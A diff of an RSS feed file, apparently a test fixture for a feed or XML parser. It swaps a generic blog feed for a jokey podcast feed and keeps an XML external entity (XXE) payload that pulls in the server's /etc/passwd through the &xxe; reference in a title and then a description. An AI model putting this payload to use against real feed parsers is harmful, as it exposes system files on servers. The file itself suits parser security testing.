@@ -1,18 +1,26 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
 <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-<channel>
-    <title>The Blog</title>
-    <link>http://example.com/</link>
-    <description>A blog about things</description>
-    <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
-    <item>
-        <title>&xxe;</title>
-        <link>http://example.com</link>
-        <description>a post</description>
-        <author>author@example.com</author>
-        <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
-    </item>
-</channel>
-</rss>
+    <rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+      <channel>
+        <title>The Facebook Podcast</title>
+        <link>https://thefacebook.com/podcast</link>
+        <description>&xxe;</description>
+        <language>en</language>
+        <itunes:image href="https://thefacebook.com/podcast/image.png"/>
+        <itunes:explicit>true</itunes:explicit>
+        <itunes:owner>
+        <itunes:email>hexa@thefacebook.com</itunes:email>
+        </itunes:owner>
+        <item>
+          <title>A Legend Is Born</title>
+          <description>How to code 10x faster with 10x more bugs</description>
+          <enclosure url="https://thefacebook.com/podcast/episode1.mp3" length="12345" type="audio/mpeg"/>
+          <itunes:image href="https://thefacebook.com/podcast/episode1.png" />
+          <pubDate>Fri, 06 Apr 1984 00:00:01 GMT</pubDate>
+          <guid>684CFFCD-CFA0-FACE-B00C-2F5473246A72</guid>
+          <itunes:explicit>true</itunes:explicit>
+          <itunes:duration>13:37</itunes:duration>
+        </item>>
+      </channel>
+    </rss>
